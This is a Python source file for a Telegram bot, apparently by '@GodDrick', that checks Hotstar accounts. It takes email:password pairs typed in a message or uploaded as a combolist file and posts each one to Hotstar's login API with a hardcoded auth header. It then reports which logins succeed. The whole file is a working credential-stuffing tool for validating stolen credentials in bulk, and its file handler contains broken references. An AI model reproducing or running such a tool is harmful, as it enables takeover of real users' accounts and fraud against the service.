import requests
import json
import re
import sys
import os
import asyncio
from io import BytesIO

from pyrogram import Client, filters, idle
from pyrogram import __version__
from pyrogram.types import Message
import logging

try:
    api_id = int(os.environ.get("APP_ID"))
    api_hash = os.environ.get("APP_HASH")
    token = os.environ.get("BOT_TOKEN")
except:
    print("Environment variables missing, i am quitting kthnxbye")
    exit(1)

# Env vars support soon....and will try to support multiple acc check after exams shit, kthnxbye

HotstarChecker = Client("HotstarCheckerBot", api_id, api_hash, bot_token=token)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
log = logging.getLogger(__name__)
log.info("--------------------------------------")
log.info("|> Hotstar Checker Bot By @GodDrick <|")
log.info("--------------------------------------")
log.info("Pyro Version: " + __version__)
log.setLevel(logging.WARNING)

if sys.version_info[0] < 3 or sys.version_info[1] < 6:
    log.error("Use a python version of 3.6+... quitting!")
    quit(1)
    
    
@HotstarChecker.on_message(filters.private & filters.text, group=1)
async def checker(bot: HotstarChecker, message: Message):
    if message.text.startswith("/") or message.text.startswith("!"):
        return
    omk = await message.reply(f"<i>Checking.....</i>")    
    try:
        fun = "."
        for l in range(5): # hehe fun, to look cool
            await omk.edit(f"<i>Checking{fun}</i>")
            await asyncio.sleep(0.1)
            fun = fun+"."
        if len(message.text.split(None, 1)) > 1:    
            combo_list = list(
                {combo.strip() for combo in message.text.split("\n") if combo.strip()}
            )
            final = "<b><u>Hotstar Accounts Checked:</b></u>\n"           
            hits = 0
            bad = 0
            for account in combo_list:
                try:
                    email, password = account.split(":")
                    url = 'https://api.hotstar.com/in/aadhar/v2/web/in/user/login'
                    payload = {"isProfileRequired":"false","userData":{"deviceId":"a7d1bc04-f55e-4b16-80e8-d8fbf4c91768","password":password,"username":email,"usertype":"email"}}
                    headers = {
                        'content-type': 'application/json',
                        'Referer': 'https://www.hotstar.com/',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
                        'Accept': '*/*',
                        'hotstarauth': 'st=1542433344~exp=1542439344~acl=/*~hmac=7dd9deaf6fb16859bd90b1cc84b0d39e0c07b6bb2e174ffecd9cb070a25d9418',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 FKUA/website/41/website/Desktop'
                        }
                    r = requests.post(url, data=json.dumps(payload), headers=headers)
                    if r.status_code==200:
                        final += f"\n- <code>{account}</code>: Valid ✅"             
                        hits += 1
                    else:
                        final += f"\n- <code>{account}</code>: Invalid ❌"
                        bad += 1
                except:
                    final += f"\n- <code>{account}</code>: Invalid Format ❌"
                    bad += 1
                    
            final  += f"\n\n<b>Summary:</b>\n<b>Total Accs:</b> <code>{len(combo_list)}</code>\n<b>Hits:</b> <code>{hits}</code>\n<b>Bads:</b> <code>{bad}</code>\n\n<b>Checked by {message.from_user.mention}</b>\n<i>With ❤️ By @GodDrick</i>"        
            if len(final) > 4000:
                cleanr = re.compile("<.*?>")
                cleantext = re.sub(cleanr, "", final)
                with BytesIO(str.encode(cleantext)) as output:
                    output.name = "hotstar_result.txt"
                    await bot.send_document(
                        chat_id=message.chat.id,
                        document=output,
                        file_name="hotstar_result.txt",
                        caption=f"<b>Summary:</b>\n<b>Total Accs:</b> <code>{len(combo_list)}</code>\n<b>Hits:</b> <code>{hits}</code>\n<b>Bads:</b> <code>{bad}</code>\n\n<b>Checked by {message.from_user.mention}</b>\n<i>With ❤️ By @GodDrick</i>",
                    )
                await omk.delete()    
                return    
            await omk.edit(final)
            return
        
        msg = message.text
        email, password = msg.split(":")
        url = 'https://api.hotstar.com/in/aadhar/v2/web/in/user/login'
        payload = {"isProfileRequired":"false","userData":{"deviceId":"a7d1bc04-f55e-4b16-80e8-d8fbf4c91768","password":password,"username":email,"usertype":"email"}}
        headers = {
            'content-type': 'application/json',
            'Referer': 'https://www.hotstar.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
            'Accept': '*/*',
            'hotstarauth': 'st=1542433344~exp=1542439344~acl=/*~hmac=7dd9deaf6fb16859bd90b1cc84b0d39e0c07b6bb2e174ffecd9cb070a25d9418',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 FKUA/website/41/website/Desktop'
            }
        r = requests.post(url, data=json.dumps(payload), headers=headers)
        if (r.status_code==200):
            await omk.edit(
                f"<u><b>The Hotstar Account is Valid✅</b></u>\n\n**Email:** `{email}`\n**Pass:** `{password}`\n\n<b>Checked By: {message.from_user.mention}</b>\n__With love by @GodDrick ❤️__",
            )
        else:
            await omk.edit(
                f"<u><b>The Hotstar Account is Invalid❌</b></u>\n\n**Email:** `{email}`\n**Pass:** `{password}`\n\n<b>Checked By: {message.from_user.mention}</b>\n__With love by @GodDrick ❤️__",
            )
    except:
        await omk.edit("❌ --**Something Went Wrong!**-- ❌\n\n__Make sure you have put account in correct order, i.e, email:pass... retry again!__")
        
        
@HotstarChecker.on_message(filters.private & filters.document, group=1)
async def checker(bot: HotstarChecker, message: Message):  
    file_type = message.document.file_name.split(".")[-1]  
    if file_type != "txt":
        await message.reply("Send the combolist in a .txt file...")
        return
    
    if int(int(message.document.file_size)/1024) >= 400:
        await message.reply("Bruhhhhh.... This file is toooooooo big!!!!!!!!!!!!!")
        return   
    
    owo = await message.reply("__Checking... this might take upto a few minutes...__")
    combos = await bot.download(message, "./")
    with open(combos) as f:    
        accs = f.read().splitlines()
        hits = 0
        bad = 0
        hit_accs = "Hits Accounts:\n"
        bad_accs = "Bad Accounts:\n"
        try:
            for one_acc in accs:
                email, password = one_acc.split(":")
                try:
                    email, password = account.split(":")
                    url = 'https://api.hotstar.com/in/aadhar/v2/web/in/user/login'
                    payload = {"isProfileRequired":"false","userData":{"deviceId":"a7d1bc04-f55e-4b16-80e8-d8fbf4c91768","password":password,"username":email,"usertype":"email"}}
                    headers = {
                        'content-type': 'application/json',
                        'Referer': 'https://www.hotstar.com/',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
                        'Accept': '*/*',
                        'hotstarauth': 'st=1542433344~exp=1542439344~acl=/*~hmac=7dd9deaf6fb16859bd90b1cc84b0d39e0c07b6bb2e174ffecd9cb070a25d9418',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 FKUA/website/41/website/Desktop'
                        }
                    r = requests.post(url, data=json.dumps(payload), headers=headers)
                    if r.status_code==200:
                        hit_accs += f"\n- <code>{account}</code>: Valid ✅"             
                        hits += 1
                    else:
                        bad_accs += f"\n- <code>{account}</code>: Invalid ❌"
                        bad += 1
                except:
                    bad_accs += f"\n- <code>{account}</code>: Invalid Format ❌"
                    bad += 1
                    
            cleanr = re.compile("<.*?>")
            cleantext = re.sub(cleanr, "", hit_accs+"\n\n"+bad_accs)
            with BytesIO(str.encode(cleantext)) as output:
                output.name = "hotstar_result.txt"
                await bot.send_document(
                    chat_id=message.chat.id,
                    document=output,
                    file_name="hotstar_result.txt",
                    caption=f"<b>Summary:</b>\n<b>Total Accs:</b> <code>{len(accs)}</code>\n<b>Hits:</b> <code>{hits}</code>\n<b>Bads:</b> <code>{bad}</code>\n\n<b>Checked by {message.from_user.mention}</b>\n<i>With ❤️ By @GodDrick</i>",
                )
            await omk.delete()  
            if os.path.exists(combos):
                os.remove(combos)                
        except:
            await owo.edit("❌ --**Something Went Wrong!**-- ❌\n\n__Make sure you have put account in correct order in the file, i.e, email:pass... retry again!__")
        
# dont let others add bot to chat coz that will make the bot spam it and get rate limited.... uhmm and ntg else, you can edit accordingly        
@HotstarChecker.on_message(filters.new_chat_members)
async def welcome(bot: HotstarChecker, message: Message):
    joiner = await bot.get_me() 
    for user in message.new_chat_members:
        if int(joiner.id) == int(user.id):
            await message.reply_text("I am made to work only in PMs, so I am leaving this chat... see ya!")  
            await bot.leave_chat(message.chat.id, delete=True)
        
       
@HotstarChecker.on_message(filters.command("start"))
async def start(_, message: Message):      
    await message.reply("Hello, I am a simple hotstar checker bot created by @GodDrick! Type /help to get to know about my usages!")
    
    
@HotstarChecker.on_message(filters.command("help"))
async def help(_, message: Message):      
    await message.reply("Just send me the email and password in the format email:pass and I will check it for you, thats it!"
                        " If you want to check multiple accounts, use this format:\n\n`email1:pass1\nemail2:pass2\nemail3:pass3`\nThat's it!"
                        " \n\n--Combolist file support soon!-- :)",
                       )    
    

if __name__ == "__main__":
    HotstarChecker.start()    
    idle()
